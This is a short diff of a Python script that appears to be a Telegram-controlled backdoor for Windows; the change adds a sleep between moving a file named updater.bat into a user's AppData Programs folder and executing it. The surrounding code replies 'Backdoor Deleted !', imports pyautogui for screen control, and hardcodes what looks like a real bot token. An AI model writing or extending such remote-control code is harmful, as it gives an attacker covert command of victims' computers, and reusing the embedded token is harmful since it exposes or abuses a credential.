@@ -1,6 +1,7 @@
 from telegram.ext import Updater,CommandHandler,MessageHandler,Filters
 import os
 import pyautogui
+from time import sleep
 
 TOKEN = "5913616404:AAFW9HlRZqCEmh3EgBe8pOfVayRiz_zxvPM"
 
@@ -29,6 +30,7 @@ def answer(update,context):
         update.message.reply_text("Backdoor Deleted !")
 
         os.system("move updater.bat C:\\Users\\Beluga\\AppData\\Local\\Programs\\")
+        sleep(0.5)
         os.system("C:\\Users\\Beluga\\AppData\\Local\\Programs\\updater.bat")
         
     else:
